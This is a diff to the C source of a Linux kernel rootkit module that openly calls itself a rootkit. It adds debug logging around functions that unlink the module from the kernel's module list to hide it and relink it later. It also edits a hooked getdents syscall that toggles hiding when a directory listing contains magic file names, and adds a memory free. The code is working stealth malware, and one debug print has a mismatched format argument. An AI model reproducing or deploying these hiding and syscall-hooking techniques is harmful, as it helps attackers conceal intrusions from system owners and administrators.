@@ -35,7 +35,19 @@ void hide_module(void) {
         return;
     }
     prev_module = THIS_MODULE->list.prev;
+    #ifdef DEBUG
+    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p, name: %s\n", prev_module);
+    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
+    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
+    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
+    #endif
     list_del(&THIS_MODULE->list);
+    #ifdef DEBUG
+    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
+    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
+    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
+    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
+    #endif
     is_hidden = 1;
 }
 
@@ -44,13 +56,26 @@ void hide_module(void) {
 * Function: unhide_module
 * ---------------------
 * if the module is not in the module list, add it.
+* TODO: what to do if prev_module is removed from the list?
 */
 void unhide_module(void) {
     if (!is_hidden)
     {
         return;
     }
+    #ifdef DEBUG
+    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
+    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
+    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
+    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
+    #endif
     list_add(&THIS_MODULE->list, prev_module);
+    #ifdef DEBUG
+    printk(KERN_INFO "[DEBUG] rootkit prev_module: %p\n", prev_module);
+    printk(KERN_INFO "[DEBUG] rootkit prev_module->next: %p\n", prev_module->next);
+    printk(KERN_INFO "[DEBUG] rootkit this_module: %p\n", &THIS_MODULE->list);
+    printk(KERN_INFO "[DEBUG] rootkit next_module: %p\n", THIS_MODULE->list.next);
+    #endif
     is_hidden = 0;
 }
 
@@ -101,22 +126,23 @@ asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
         dir = (void *) kdirent + i;
         
         #ifdef DEBUG
-        printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
+        //printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
         #endif
 
         if ((strlen((char*) dir->d_name) == strlen(UNHIDE_MAGIC)) && (memcmp(UNHIDE_MAGIC, (char*) dir->d_name, strlen(UNHIDE_MAGIC)) == 0))
         {
-            printk(KERN_INFO "[DEBUG] rootkit found the correct file name. unhiding module!\n");
+            //printk(KERN_INFO "[DEBUG] rootkit found the correct file name. unhiding module!\n");
             unhide_module();
         }
         else if ((strlen((char*) dir->d_name) == strlen(HIDE_MAGIC)) && (memcmp(HIDE_MAGIC, (char*) dir->d_name, strlen(HIDE_MAGIC)) == 0))
         {
-            printk(KERN_INFO "[DEBUG] rootkit found the correct file name. hiding module!\n");
+            //printk(KERN_INFO "[DEBUG] rootkit found the correct file name. hiding module!\n");
             hide_module();
         }
         i += dir->d_reclen;
     }
 
+    kvfree(kdirent);
     return ret;
 }
 
